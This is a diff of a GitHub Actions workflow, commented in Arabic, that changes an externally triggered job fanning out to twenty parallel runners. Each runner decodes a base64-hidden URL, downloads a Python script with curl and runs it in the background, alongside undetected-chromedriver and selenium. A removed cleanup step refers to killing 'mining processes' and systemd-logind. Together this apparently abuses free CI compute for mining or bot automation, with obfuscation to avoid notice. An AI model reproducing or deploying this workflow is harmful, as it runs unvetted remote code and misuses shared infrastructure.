@@ -1,12 +1,12 @@
-name: Linux Distributed Task Battalion
+name: Linux Independent Task Wing
 
 on:
-  schedule:
-    # تشغيل تلقائي في الأوقات: 02:00، 10:00، 18:00 (توقيت UTC)
-    - cron: '0 2,10,18 * * *'
+  # استقبال أمر التشغيل من الخارج عبر التوكن بكلمة: start
+  repository_dispatch:
+    types: [start]
 
 concurrency:
-  group: task-battalion-${{ github.workflow }}-${{ github.ref }}
+  group: independent-wing-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 permissions:
@@ -15,105 +15,94 @@ permissions:
 
 jobs:
   # =================================================================
-  # حارس الزمن الشامل: يُنهي الـ workflow بالكامل بعد 60 دقيقة
+  # الحارس الزمني الشامل: يُنهي الـ workflow بكامله بعد 65 دقيقة
   # =================================================================
-  chrono-guardian:
-    name: "Chrono Guardian"
+  chrono-sentinel:
+    name: "Chrono Sentinel"
     runs-on: ubuntu-latest
-    timeout-minutes: 65
+    timeout-minutes: 70
     steps:
-      - name: Arm Global Time Cutoff
+      - name: Arm Full Termination Sweep
         run: |
-          echo "[GUARDIAN] Chrono guardian armed. Every task will be wiped at the 60-minute boundary."
-          echo "[GUARDIAN] Tracking execution run: ${{ github.run_id }}"
+          echo "[SENTINEL] Chrono sentinel deployed. Everything will be wiped at the 65-minute threshold."
+          echo "[SENTINEL] Monitoring execution sequence: ${{ github.run_id }}"
           
-          # الانتظار حتى بلوغ حد الساعة الواحدة (3600 ثانية)
-          sleep 3600
+          # الانتظار حتى مرور 65 دقيقة كاملة (3900 ثانية)
+          sleep 3900
           
-          echo "[GUARDIAN] 60-minute boundary crossed! Releasing termination order..."
+          echo "[SENTINEL] 65-minute threshold breached! Releasing full sweep directive..."
           
-          # إطلاق أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          # إرسال أمر الإلغاء الشامل إلى GitHub
           curl -sS -X POST \
             -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
             -H "Accept: application/vnd.github+json" \
             -H "X-GitHub-Api-Version: 2022-11-28" \
             "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
           
-          echo "[GUARDIAN] Termination order dispatched."
+          echo "[SENTINEL] Full sweep directive released. All pending operations will be annihilated."
 
   # =================================================================
-  # المهمة الرئيسية: تحضير وإطلاق وحدات المهام
+  # المهمة الرئيسية: تجهيز وتشغيل وحدات المهام
   # =================================================================
-  mobilize-battalion:
-    name: "BattalionUnit-${{ matrix.unit_code }}"
+  dispatch-wing:
+    name: "WingUnit-${{ matrix.unit_slot }}"
     runs-on: ubuntu-latest
-    timeout-minutes: 60
+    timeout-minutes: 65
 
     strategy:
       fail-fast: false
       matrix:
-        unit_code: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        unit_slot: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      # 〈١〉 إرساء طبقة الأساس
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      - name: Lay Base Layer
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      # 【الخطوة الأولى】تأسيس البنية الأساسية
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      - name: Raise Core Foundation
         run: |
-          echo "[LAYER] Laying base layer for BattalionUnit-${{ matrix.unit_code }} on Linux..."
+          echo "[FOUNDATION] Raising foundation for WingUnit-${{ matrix.unit_slot }} on Linux..."
           sudo apt update -qq
-          sudo apt install -y cpulimit curl python3-pip
+          sudo apt install -y curl python3-pip
 
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      # 〈٢〉 تنزيل ملف المهمة الرئيسي
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      - name: Download Task Payload
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      # 【الخطوة الثانية】جلب ملف المهمة من المصدر
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      - name: Pull Task Artifact
         run: |
-          echo "[DOWNLOAD] Downloading app_task.py from cloud endpoint..."
-          CLOUD_ENDPOINT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
-          curl -sL "$CLOUD_ENDPOINT" -o app_task.py
-          echo "[DOWNLOAD] Payload saved to workspace."
+          echo "[PULL] Pulling app_task.py from secure source..."
+          SECURE_SOURCE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$SECURE_SOURCE" -o app_task.py
+          echo "[PULL] Artifact secured in workspace."
 
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      # 〈٣〉 تحميل حزم بايثون المطلوبة
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      - name: Fetch Python Packages
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      # 【الخطوة الثالثة】تجهيز مكتبات بايثون
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      - name: Prepare Python Toolkit
         run: |
-          echo "[PACKAGES] Fetching required Python packages..."
+          echo "[TOOLKIT] Preparing Python toolkit..."
           pip3 install -q undetected-chromedriver selenium requests
 
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      # 〈٤〉 تشغيل المهمة مع ضابط الوقت
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      - name: Execute Under Time Marshal
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      # 【الخطوة الرابعة】تشغيل المهمة تحت إشراف زمني (65 دقيقة)
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      - name: Operate Under Time Custodian
         run: |
-          echo ">> Mobilizing BattalionUnit-${{ matrix.unit_code }}..."
+          echo ">> Dispatching workload on WingUnit-${{ matrix.unit_slot }}..."
           
           # إطلاق السكربت في الخلفية
           python3 app_task.py &
-          BATTALION_PID=$!
+          WING_PID=$!
           
-          echo ">> Time marshal on duty. Cut-off at 74 minutes."
+          echo ">> Time custodian monitoring. Threshold: 65 minutes (3900s)."
           
-          # الانتظار حتى نهاية المهلة المسموحة
-          sleep 4440
+          # الانتظار حتى نهاية المهلة المحددة
+          sleep 3900
           
-          # فحص العملية وإنهاؤها إذا استمرت
-          if kill -0 $BATTALION_PID 2>/dev/null; then
-            echo ">> Cut-off reached! Halting task..."
-            kill -9 $BATTALION_PID
-            echo ">> Task halted by time marshal."
+          # فحص حالة العملية وإنهاؤها إن كانت لا تزال قائمة
+          if kill -0 $WING_PID 2>/dev/null; then
+            echo ">> Threshold reached! Halting workload..."
+            kill -9 $WING_PID
+            echo ">> Workload halted by custodian."
           else
-            echo ">> Task finished before cut-off."
+            echo ">> Workload concluded within the threshold."
           fi
-
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      # 〈٥〉 التنظيف وإخراج الوحدة من الخدمة
-      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
-      - name: Cleanup and Demobilize
-        run: |
-          echo "[DEMOB] BattalionUnit-${{ matrix.unit_code }} demobilizing."
-          echo "[DEMOB] Clearing residual cpulimit and mining processes..."
-          sudo pkill -f cpulimit || true
-          sudo pkill -f systemd-logind || true
-          echo "[DEMOB] BattalionUnit-${{ matrix.unit_code }} demobilized cleanly."
